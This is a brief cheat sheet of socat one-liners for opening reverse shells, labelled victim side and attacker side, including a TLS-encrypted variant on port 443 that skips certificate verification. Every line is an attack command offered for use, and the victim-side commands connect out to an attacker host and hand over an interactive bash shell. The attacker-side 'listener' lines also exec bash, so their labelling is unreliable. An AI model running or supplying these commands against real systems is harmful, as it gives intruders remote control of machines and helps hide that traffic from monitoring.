# Reverse Shell (Victim side)
socat TCP:<IP>:<port> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# Listerner (Attacker side)
socat TCP-LISTEN:<port>,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# Encrypted Reverse Shell - Victim
socat openssl:<IP>:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# Encrypted Reverse Shell - Attacker
socat openssl-listen:443,cert=cert.pem,key=key.pem,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
